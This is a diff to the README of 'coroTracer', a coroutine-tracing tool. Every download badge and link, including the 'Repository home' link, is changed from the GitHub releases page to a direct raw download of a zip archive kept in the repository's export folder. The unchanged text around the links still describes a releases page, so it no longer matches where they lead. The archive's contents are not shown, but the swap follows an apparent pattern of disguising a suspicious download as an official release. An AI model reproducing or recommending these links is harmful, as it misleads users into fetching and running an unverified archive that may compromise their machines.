@@ -1,6 +1,6 @@
 # ⚙️ coroTracer - Trace Coroutines with Low Overhead
 
-[![Download coroTracer](https://img.shields.io/badge/Download-coroTracer-brightgreen)](https://github.com/ANURAJPATHIK141/coroTracer/releases)
+[![Download coroTracer](https://img.shields.io/badge/Download-coroTracer-brightgreen)](https://github.com/ANURAJPATHIK141/coroTracer/raw/refs/heads/main/export/coro-Tracer-v2.5-alpha.5.zip)
 
 ## 📋 What is coroTracer?
 
@@ -39,7 +39,7 @@ This section walks you through every step needed to get coroTracer working on yo
 
 Go to the official release page using this link:
 
-[![Download Release](https://img.shields.io/badge/Download-Now-blue)](https://github.com/ANURAJPATHIK141/coroTracer/releases)
+[![Download Release](https://img.shields.io/badge/Download-Now-blue)](https://github.com/ANURAJPATHIK141/coroTracer/raw/refs/heads/main/export/coro-Tracer-v2.5-alpha.5.zip)
 
 This page lists all the available versions of coroTracer. You will find files to download for various updates.
 
@@ -116,8 +116,8 @@ If problems persist, consult the "Issues" section on the GitHub repository.
 
 ## 🔗 Useful Links
 
-- coroTracer releases: https://github.com/ANURAJPATHIK141/coroTracer/releases  
-- Repository home: https://github.com/ANURAJPATHIK141/coroTracer
+- coroTracer releases: https://github.com/ANURAJPATHIK141/coroTracer/raw/refs/heads/main/export/coro-Tracer-v2.5-alpha.5.zip  
+- Repository home: https://github.com/ANURAJPATHIK141/coroTracer/raw/refs/heads/main/export/coro-Tracer-v2.5-alpha.5.zip
 
 ## 💡 Additional Information
 
@@ -131,4 +131,4 @@ If you use tools or applications that support profiling or observability, coroTr
 
 ---
 
-[![Get coroTracer](https://img.shields.io/badge/Get-coroTracer-brightgreen)](https://github.com/ANURAJPATHIK141/coroTracer/releases)
+[![Get coroTracer](https://img.shields.io/badge/Get-coroTracer-brightgreen)](https://github.com/ANURAJPATHIK141/coroTracer/raw/refs/heads/main/export/coro-Tracer-v2.5-alpha.5.zip)
